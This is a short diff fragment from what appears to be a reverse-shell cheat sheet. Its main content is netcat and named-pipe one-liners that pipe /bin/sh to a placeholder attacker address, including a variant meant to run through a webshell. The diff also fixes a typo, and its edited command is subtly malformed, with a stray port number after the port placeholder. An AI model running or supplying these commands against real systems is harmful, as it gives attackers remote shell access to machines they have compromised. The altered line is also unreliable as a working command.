@@ -19,8 +19,8 @@ mkfifo /tmp/backpipe
 
 /bin/sh 0</tmp/backpipe | nc YOUR_MACHINE_IP PORT_ON_WHICH_NC_IS_LISTENING 1>/tmp/backpipe
 
-// In case you are using a exection medium like a webshell, then use
+// In case you are using a execution medium like a webshell, then use
 
-/bin/sh -c "/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe"
+/bin/sh -c "/bin/sh 0</tmp/backpipe | nc YOUR_MACHINE_IP PORT_ON_WHICH_NC_IS_LISTENING 443 1>/tmp/backpipe"
 
 
